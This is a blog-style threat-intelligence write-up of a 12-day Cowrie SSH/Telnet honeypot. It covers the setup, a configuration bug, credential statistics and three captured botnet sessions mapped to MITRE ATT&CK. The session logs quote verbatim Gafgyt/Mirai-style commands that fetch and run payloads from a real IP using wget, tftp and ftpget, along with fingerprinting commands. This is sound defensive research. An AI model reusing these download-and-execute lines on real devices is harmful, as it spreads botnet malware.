# I ran a real SSH/Telnet honeypot on the open internet for 12 days. Here's what attacked it.

*Collection window: Aug 20 - Sep 1, 2026 (12 days).*

## What I built

Provisioned a VPS via Terraform (DigitalOcean, firewall managed as code),
deployed [Cowrie](https://github.com/cowrie/cowrie) (fake SSH/Telnet) via
Docker Compose, and wired a GitHub Actions pipeline that redeploys the
honeypot config on every push to `main`. Logs are shipped off-box daily to
a private git branch so a compromised container can't destroy its own
evidence. Repo: [`rvasan1310/honeypot-threat-intel`](https://github.com/rvasan1310/honeypot-threat-intel).

## Known limitation: no post-auth command data for the Aug 20 - Sep 1 window

A misconfiguration in `cowrie.cfg` (three keys pointed at bundled-resource
paths that don't exist in the `cowrie/cowrie:latest` image) crashed every
single session immediately after a successful login, before the attacker
ever reached a shell. That means the connection/credential numbers below
are solid, but there is **zero post-auth command data for Aug 20 - Sep 1**
— no malware staging, no recon commands, no miner drops observed, because
none were ever captured, not because attackers didn't attempt them. Found
and fixed same-day (commit `a638b86`); real command data started arriving
within minutes of the fix going live, and the "Concrete stories" section
below is built from that fresh data.

## The numbers

Pulled from `analysis/output/summary.json`:

- Total events logged: **103,967**
- Total connection attempts: **21,943**
- Unique sessions: **21,965**
- Unique source IPs: **1,596**
- Successful logins: **13,093** (all crashed pre-shell, see limitation above)
- Failed logins: **12,795**
- Top credential pairs tried: *(see chart)*

![Top credentials](../output/top_credentials.png)
![Connections per day](../output/connections_per_day.png)

*Country breakdown and command-category chart are not included this round:
country requires a MaxMind GeoLite2 DB (`--geoip` flag, not yet wired up),
and command categories are empty for the reason above.*

The two most-tried pairs — `enable\x00`/`linuxshell\x00` (2,787 attempts)
and `system\x00`/`shell\x00` (2,739 attempts) — dwarf everything else and
carry trailing null bytes, a fingerprint of raw Telnet-negotiation scanner
tools rather than manual attempts; this is almost certainly one or two
automated botnet scanners hammering the telnet listener. Further down the
list, `root/xc3511` (272) and `root/vizxv` (205) are the original Mirai
botnet's hardcoded default-credential list for IP cameras and DVRs —
nearly a decade old and still in active use by scanners today. The rest
(`admin/admin`, `root/admin`, `support/support`, `root/default`) are
generic router/appliance default-credential guesses, consistent with
broad, untargeted IoT credential stuffing rather than anything aimed at
this host specifically.

## Concrete stories

The Aug 20 - Sep 1 window has none — see the limitation above. But the fix
went live on 2026-09-01 at ~20:20 UTC, and real post-auth command data
started arriving within minutes. These three stories are pulled directly
from the live container log a few hours post-fix (not yet shipped to the
`logs` branch by the nightly cron at the time of writing, but every command
and timestamp below is real, session IDs included).

### Story 1: A Gafgyt/Bashlite loader chain, live end to end

Session `876599c4878b` from `200.59.122.158` logged in with `admin/admin`
at `2026-09-01T22:30:42Z` and ran, in order:

```
enable / system / shell / sh / linuxshell / enablelinuxshell
ping ;sh
echo -e "\x47\x41\x59\x46\x47\x54"          # decodes to "GAYFGT"
cd /proc && cat self/cmdline
>/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/
>/var/d && chmod 777 /var/d && /var/d && cd /var/
   ... (repeated across /var/tmp, /var/run, /dev, /dev/shm, /data,
        /etc, /mnt, /usr, /home, /root — 12 mount points total)
(wget http://185.93.89.72/wget -O- || busybox wget ...) > w; chmod 777 w; ./w; rm -rf w
(tftp -g 185.93.89.72 -r tftp -l- || busybox tftp ...) > t; chmod 777 t; ./t; rm -rf t
(ftpget 185.93.89.72 f ftpget || busybox ftpget ...) > f; chmod 777 f; ./f; rm -rf f
```

The whole session lasted 44 seconds. The shell-fingerprint variants
(`enable`, `system`, `shell`, `sh`...) and the hex string are textbook
**Gafgyt/Bashlite** (aka Lizkebab/Torlus) behavior — `\x47\x41\x59\x46\x47\x54`
decodes to `GAYFGT`, a known Gafgyt shell-liveness check echoed between
every staging step. After confirming a writable+executable directory, it
fell back through three separate fetchers (`wget` → `tftp` → `ftpget`,
each with a `busybox` fallback) all pointing at the same IP,
`185.93.89.72` — which is itself one of the source IPs attacking this
honeypot (see Story 2). Maps to **T1082** (System Information Discovery,
the `/proc/cmdline` read and writable-dir probing) and **T1105** (Ingress
Tool Transfer, the three-stage download attempt).

### Story 2: The payload host attacks under its own name, seconds later

Session `789eddd09253` from `185.93.89.72` — the same IP Story 1's bot
tried to fetch a payload from — logged in with `admin/admin` just 2
seconds after Story 1's session started (`2026-09-01T22:30:44Z`), ran the
same shell-fingerprint sequence with a shorter `GAY` variant of the hex
check, then:

```
echo -e '\x6b\x61\x6d\x69/dev' > /dev/.nippon; cat /dev/.nippon; rm /dev/.nippon   # writes/reads/deletes "kami/dev"
rm /dev/.t; rm /dev/.sh; rm /dev/.human     # deleting files it didn't create this session
cd /dev/
cp /bin/echo dvrHelper; >dvrHelper; chmod 777 dvrHelper; echo -e "\x47\x41\x59"
cat /bin/echo
```

`rm /dev/.t; rm /dev/.sh; rm /dev/.human` reads as one bot clearing marker
files a *different* malware family would have left behind — competing
IoT botnets are known to evict each other from the same device. `dvrHelper`
is a recognizable filename from real DVR/NVR-targeting Mirai-family
malware; here it's just `/bin/echo` copied under that name, a cheap
write+execute-permission test before a real binary would be dropped in
its place. Session closed after 6 seconds. Maps to **T1105** (staging a
binary under a malware-associated filename) and arguably **T1070**
(Indicator Removal, if the `rm` calls are in fact clearing a rival's
artifacts rather than its own).

### Story 3: One IP, four credentials, one fingerprint routine

`104.194.10.16` opened four separate sessions over 27 minutes, cycling
through `admin/admin`, `root/anko`, `root/54321`, and `root/default`, each
running the identical sequence `enable → linuxshell → system → shell → sh
→ /bin/busybox UNSTABLE`, each command spaced ~4-6 seconds apart within a
session. `busybox UNSTABLE` is a deliberately-invalid BusyBox applet name
— it fails, but the failure banner reveals the BusyBox build and target
architecture, which a botnet uses to pick the right malware binary for
the device. Consistent timing and command order across all four sessions
indicates a scripted client working down a credential list rather than a
human. Maps to **T1592** (Gather Victim Host Information) and **T1110**
(Brute Force, across the four credential attempts from one source).

## MITRE ATT&CK mapping observed

| Behavior | Technique | Observed? |
|---|---|---|
| Password brute forcing | T1110 Brute Force | Yes — 12,795 failed attempts (Aug 20-Sep 1) + Story 3 |
| Successful login w/ guessed creds | T1078 Valid Accounts | Yes — 13,093 (Aug 20-Sep 1) |
| Commands run post-login | T1059 Command and Scripting Interpreter | Yes — 454 events in first ~4h post-fix |
| Recon / device fingerprinting | T1082 / T1592 | Yes — Stories 1 and 3 |
| File download attempts (wget/tftp/ftpget) | T1105 Ingress Tool Transfer | Yes — Stories 1 and 2 |
| Possible rival-malware cleanup | T1070 Indicator Removal | Plausible — Story 2 |
| Cryptominer indicators | T1496 Resource Hijacking | Not observed yet |

## What I'd do differently / next steps

- [x] Re-run collection now that the post-auth capture bug is fixed —
      done, command data confirmed flowing within minutes of the fix
- [ ] Let the fixed collector run a full window, then re-run
      `parse_logs.py` for updated command-category charts and a fuller
      set of concrete stories beyond the three above
- [ ] Wire up `--geoip` with a MaxMind GeoLite2 DB for the country breakdown
- [ ] Add a health check that catches "container up but every session
      dying pre-shell" — the Docker healthcheck only checked the port was
      listening, which stayed true throughout this entire bug
- [ ] Add a second honeypot type (Conpot for ICS/SCADA flavor)
- [ ] Correlate source IPs against known botnet / C2 IP lists
- [ ] Longer collection window to see if credential lists rotate over time

## Repo

Terraform, Compose config, CI/CD pipeline, and analysis scripts (logs and
secrets scrubbed): [`rvasan1310/honeypot-threat-intel`](https://github.com/rvasan1310/honeypot-threat-intel)
